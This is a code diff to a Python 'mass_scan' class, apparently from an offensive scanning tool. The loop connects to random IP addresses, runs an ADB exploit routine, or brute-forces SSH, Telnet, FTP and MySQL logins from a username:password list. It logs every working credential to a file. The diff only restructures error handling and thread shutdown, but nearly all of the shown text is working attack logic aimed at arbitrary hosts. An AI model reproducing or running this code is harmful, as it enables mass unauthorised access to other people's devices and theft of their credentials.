@@ -52,59 +52,69 @@ class mass_scan:
  def scan(self):
   time.sleep(1)
   while True:
-   if self.stop==True:
-         break
-   if self.ip_range==None:
-     ip=getip()
-   else:
-     ip=self.ip_range.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
-   i=False
    try:
-    so=socket.socket()
-    so.settimeout(self.timeout)
-    so.connect((ip,self.port))
-    i=True
-    so.close()
-   except:
-    pass
-   if self.stop==True:
+    if self.stop==True:
          break
-   if i==True:
-    if self.protocol=="adb":
-     q=adb_exploit(ip,timeout=self.timeout,p=self.port)
-     if q==True:
-      res="adb:{}:{}".format(ip,self.port)
-      write_file(res,self.file_name)
-      self.found.append(res)
-      if self.logs==True:
-         print(res)
+    if self.ip_range==None:
+     ip=getip()
     else:
-     if self.protocol=="ssh":
-       func=ssh
-     elif self.protocol=="telnet":
-       func=telnet
-     elif self.protocol=="ftp":
-       func=ftp
-     elif self.protocol=="mysql":
-       func=mysql
-     for x in self.word_list:
-      if self.stop==True:
+     ip=self.ip_range.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
+    i=False
+    try:
+     so=socket.socket()
+     so.settimeout(self.timeout)
+     so.connect((ip,self.port))
+     i=True
+     so.close()
+    except:
+     pass
+    if self.stop==True:
          break
-      try:
-       username=x.split(':')[0]
-       password=x.split(':')[1]
-       q=func(ip,username,password,timeout=self.timeout,p=self.port)
-       if q==True:
-        res="{}:{}:{}:{}:{}".format(self.protocol,ip,self.port,username,password)
-        write_file(res,self.file_name)
-        self.found.append(res)
-        if self.logs==True:
+    if i==True:
+     if self.protocol=="adb":
+      q=adb_exploit(ip,timeout=self.timeout,p=self.port)
+      if q==True:
+       res="adb:{}:{}".format(ip,self.port)
+       write_file(res,self.file_name)
+       self.found.append(res)
+       if self.logs==True:
          print(res)
-        break
-      except:
-       pass
+     else:
+      if self.protocol=="ssh":
+       func=ssh
+      elif self.protocol=="telnet":
+       func=telnet
+      elif self.protocol=="ftp":
+       func=ftp
+      elif self.protocol=="mysql":
+       func=mysql
+      for x in self.word_list:
+       if self.stop==True:
+         break
+       try:
+        username=x.split(':')[0]
+        password=x.split(':')[1]
+        q=func(ip,username,password,timeout=self.timeout,p=self.port)
+        if q==True:
+         res="{}:{}:{}:{}:{}".format(self.protocol,ip,self.port,username,password)
+         write_file(res,self.file_name)
+         self.found.append(res)
+         if self.logs==True:
+          print(res)
+         break
+       except:
+        pass
+   except:
+        pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
   self.stop=True
+  a=self.__dict__["found"]
+  self.reset()#this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
+  return a
